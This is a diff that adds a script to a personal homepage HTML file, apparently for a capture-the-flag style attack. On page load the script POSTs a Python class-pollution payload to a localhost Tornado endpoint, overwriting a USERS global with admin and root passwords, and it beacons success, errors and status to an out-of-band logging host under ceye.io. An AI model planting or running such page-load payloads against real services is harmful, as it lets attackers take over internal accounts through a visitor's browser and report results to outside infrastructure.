@@ -8,6 +8,56 @@
     <h1>sky-tears的个人主页</h1>
     <h1>Hello ~</h1>
     <script>
+var xhr = new XMLHttpRequest();
+var payload = {
+    "__class__": {
+        "__init__": {
+            "__globals__": {
+                "USERS": [
+                    {
+                        "username": "admin",
+                        "password": "123456"
+                    },
+                    {
+                        "username": "root",
+                        "password": "123456"
+                    }
+                ]
+            }
+        }
+    },
+    "machine_id":"host-7321"
+};
+var xhr3 = new XMLHttpRequest(); 
+xhr.open('POST', 'http://[::1]:1337/update_tornado', true);
+// xhr.setRequestHeader('Content-Type', 'application/json');
+xhr3.open('GET', 'http://running.6wox8c.ceye.io', true);
+xhr3.send();
+xhr.onload = function () {
+    var xhr1 = new XMLHttpRequest();
+    if (xhr.status === 200) {
+        // 6wox8c.ceye.io
+        xhr1.open('GET', 'http://success.6wox8c.ceye.io', true);
+        xhr1.send(); 
+        console.log(xhr.responseText);
+    }
+    else{
+        // 6wox8c.ceye.io
+        xhr1.open('GET', 'https://error.6wox8c.ceye.io', true);
+        xhr1.send(); 
+    }
+};
+xhr.onerror = function () {
+    var xhr6 = new XMLHttpRequest();
+    var xhr_status = "http://" + xhr6.statusText + 'haserror.6wox8c.ceye.io' + "/" + xhr6.status;
+    xhr6.open('GET', xhr_status, true);
+    xhr6.send(); 
+}
+xhr.send(JSON.stringify(payload));
+// xhr.send();
+var xhr5 = new XMLHttpRequest();
+xhr5.open('GET', 'http://running555.6wox8c.ceye.io', true);
+xhr5.send();
     </script>
 </body>
 </html>
